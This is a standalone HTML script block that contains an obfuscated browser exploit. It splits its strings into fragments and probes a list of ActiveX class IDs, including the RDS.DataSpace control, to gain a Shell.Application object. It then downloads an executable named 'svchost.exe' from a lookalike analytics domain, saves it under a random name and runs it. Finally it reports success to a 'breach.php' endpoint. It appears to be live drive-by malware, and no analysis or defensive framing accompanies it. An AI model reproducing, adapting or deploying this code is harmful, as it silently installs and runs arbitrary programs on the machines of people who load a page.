<script language="javascript"> 
function Cr_obj(o, nnf) { 
var frf = null; 
try { eval("frf = o.CreateObject(nnf)") }catch(e){} 
if (! frf) {try { eval("frf = o.CreateObject(nnf, \"\")") }catch(e){}} 
if (! frf) {try { eval("frf = o.CreateObject(nnf, \"\", \"\")") }catch(e){}} 
if (! frf) {try { eval("frf = o.GetObject(\"\", nnf)") }catch(e){}} 
if (! frf) {try { eval("frf = o.GetObject(nnf, \"\")") }catch(e){}} 
if (! frf) {try { eval("frf = o.GetObject(nnf)") }catch(e){}} 
return(frf); } 
var e1="msx"; var e2="ml2"; var e3=".XM"; var e4="LHT"; var e5="GE";  var e6="dod"; var e7="b.s"; 
var e8="tre"; var e9="1";   var e0="exe"; var h9="She"; var h0="ll."; var i1="App"; var i2="lic"; 
var i3="ati"; var i4="cls"; var i5="id:"; var i6="cla"; var i7="ssi"; var i8="obj"; var i9="ect"; 
var f1="BD96C556-65A3-11D0"; var f2="-983A-00C04FC29E30"; var f3="BD96C556-65A3-11D0"; var f4="-983A-00C04FC29E36"; 
var f5="AB9BCEDD-EC7E-47E1"; var f6="-9322-D4A210617116"; var f7="0006F033-0000-0000"; var f8="-C000-000000000046"; 
var f9="0006F03A-0000-0000"; var f0="-C000-000000000046"; var g1="6e32070a-766d-4ee6"; var g2="-879c-dc1fa91d2fc3"; 
var g3="6414512B-B978-451D"; var g4="-A0D8-FCFDF33E833C"; var g5="7F5B7F63-F06F-4331"; var g6="-8A26-339E03C0AE3D"; 
var g7="06723E09-F4C2-43c8"; var g8="-8358-09FCD1DB0766"; var g9="639F725F-1B2D-4831"; var g0="-A9FD-874847682010"; 
var h1="BA018599-1DB3-44f9"; var h2="-83B4-461454C84BF8"; var h3="D0C07D56-7C69-43F1"; var h4="-B4A0-25F5A11FAB19"; 
var h5="E8CCCDDF-CA28-496b"; var h6="-B050-6C07C962476B"; var h7="BD96C556-65A3-11D0"; var h8="-983A-00C04FC29E30"; 
var rndmzz = Math.round(Math.random()*99999); 
var url2="http://gooqle-analytics.com/invite/zero/svchost.exe"; 
function Core_Go(a_core) { 
var msa_obj = Cr_obj(a_core,e1+e2+e3+e4+"TP"); 
msa_obj.open(e5+"T",url2,false); 
msa_obj.send(); 
var ams_obj = Cr_obj(a_core,"a"+e6+e7+e8+"am"); 
ams_obj.type = e9; 
ams_obj.open(); 
ams_obj.Write(msa_obj.responseBody); 
var fnms = "..//"+rndmzz+"."+e0; 
ams_obj.SaveToFile(fnms,2); 
var s = Cr_obj(a_core, h9+h0+i1+i2+i3+"on"); 
try { s.ShellExecute(fnms); 
if(shellexecute=true) { 
var req = new ActiveXObject("Microsoft.XMLHTTP"); 
req.open("GET", "breach.php?cro=" + Math.random()); 
req.send(null); }} 
catch(e) {} return TRUE; } 
var fii = 0; 
var t = new Array( 
"{"+f1+f2+"}","{"+f3+f4+"}", 
"{"+f5+f6+"}","{"+f7+f8+"}","{"+f9+f0+"}","{"+g1+g2+"}","{"+g3+g4+"}","{"+g5+g6+"}","{"+g7+g8+"}","{"+g9+g0+"}","{"+h1+h2+"}","{"+h3+h4+"}","{"+h5+h6+"}","{"+h7+h8+"}",null); 
while (t[fii]) { 
var a = null; 
if (t[fii].substring(0,1) == "{") { 
a = document.createElement(i8+i9); 
a.setAttribute(i6+i7+"d", i4+i5 + t[fii].substring(1, t[fii].length - 1)); 
} else { 
try { a = new ActiveXObject(t[fii]); } catch(e){} } 
if (a) { try { 
var b = Cr_obj(a, h9+h0+i1+i2+i3+"on"); 
if (b) { if (Core_Go(a)) break; } } catch(e){} } fii++; } 
</script>